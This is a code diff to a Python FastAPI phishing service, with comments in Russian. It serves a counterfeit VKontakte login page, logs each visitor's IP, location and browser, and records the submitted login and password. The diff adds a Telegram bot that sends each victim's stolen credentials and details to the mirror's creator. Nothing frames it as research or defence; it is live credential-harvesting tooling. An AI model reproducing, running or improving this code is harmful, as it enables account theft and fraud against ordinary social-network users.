@@ -4,8 +4,17 @@ import datetime
 import json
 import db
 import aiohttp
+import asyncio
+from aiogram import Bot
 
 app = FastAPI()
+
+# Глобальный бот для отправки уведомлений (инициализируется в main.py)
+BOT = None
+
+def set_bot(bot_instance):
+    global BOT
+    BOT = bot_instance
 
 @app.get("/mirror/{path}")
 async def mirror_log(request: Request, path: str):
@@ -26,6 +35,7 @@ async def mirror_log(request: Request, path: str):
     except:
         geo = {"status": "fail"}
 
+    # Сохраняем в лог
     log_entry = {
         "ip": client_ip,
         "user_agent": user_agent,
@@ -36,29 +46,38 @@ async def mirror_log(request: Request, path: str):
     }
     db.add_log(user_id=0, action="phishing_log_mirror", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))
 
-    # Маскировка под страницу входа ВК
-    html = """
+    # Отправляем уведомление создателю зеркала
+    created_by = mirror[1]  # поле created_by
+    if BOT:
+        try:
+            msg = f"🕵️ <b>Новое посещение вашего зеркала</b>\n\nIP: <code>{client_ip}</code>\nСтрана: {geo.get('country', '—')}\nГород: {geo.get('city', '—')}\nПровайдер: {geo.get('isp', '—')}\nUser-Agent: {user_agent}\nРеферер: {referer}"
+            await BOT.send_message(created_by, msg, parse_mode="HTML")
+        except:
+            pass
+
+    # HTML-страница с маскировкой под ВК
+    html = f"""
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
         <title>Вход в ВКонтакте</title>
         <style>
-            body { background: #e5ebf1; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); width: 360px; text-align: center; }
-            .login-box img { width: 80px; margin-bottom: 20px; }
-            .login-box h2 { color: #2c3e50; }
-            .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-            .login-box button { width: 100%; padding: 10px; background: #4a76a8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
-            .login-box button:hover { background: #3a5f85; }
-            .error { color: red; margin-top: 10px; }
+            body {{ background: #e5ebf1; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
+            .login-box {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); width: 360px; text-align: center; }}
+            .login-box img {{ width: 80px; margin-bottom: 20px; }}
+            .login-box h2 {{ color: #2c3e50; }}
+            .login-box input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }}
+            .login-box button {{ width: 100%; padding: 10px; background: #4a76a8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }}
+            .login-box button:hover {{ background: #3a5f85; }}
+            .error {{ color: red; margin-top: 10px; }}
         </style>
     </head>
     <body>
         <div class="login-box">
             <img src="https://vk.com/images/icons/favicons/favicon_vk_256.ico" alt="VK">
             <h2>Вход в ВКонтакте</h2>
-            <form action="/mirror/""" + path + """" method="POST">
+            <form action="/mirror/{path}" method="POST">
                 <input type="text" name="login" placeholder="Телефон или email" required>
                 <input type="password" name="password" placeholder="Пароль" required>
                 <button type="submit">Войти</button>
@@ -83,7 +102,17 @@ async def mirror_post(request: Request, path: str):
         "time": datetime.datetime.now().isoformat()
     }
     db.add_log(user_id=0, action="phishing_creds", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))
-    html = """
+
+    # Отправляем создателю зеркала логин/пароль
+    mirror = db.get_mirror(path)
+    if mirror and BOT:
+        try:
+            msg = f"🔑 <b>Получены учётные данные</b>\n\nЛогин: {login}\nПароль: {password}\nIP: {client_ip}"
+            await BOT.send_message(mirror[1], msg, parse_mode="HTML")
+        except:
+            pass
+
+    html = f"""
     <!DOCTYPE html>
     <html>
     <head><meta charset="UTF-8"><title>Ошибка</title></head>
@@ -91,7 +120,7 @@ async def mirror_post(request: Request, path: str):
         <div style="background:white;padding:40px;border-radius:10px;text-align:center;">
             <h2 style="color:red;">Неверный логин или пароль</h2>
             <p>Пожалуйста, попробуйте снова.</p>
-            <a href="/mirror/""" + path + """">Вернуться</a>
+            <a href="/mirror/{path}">Вернуться</a>
         </div>
     </body>
     </html>
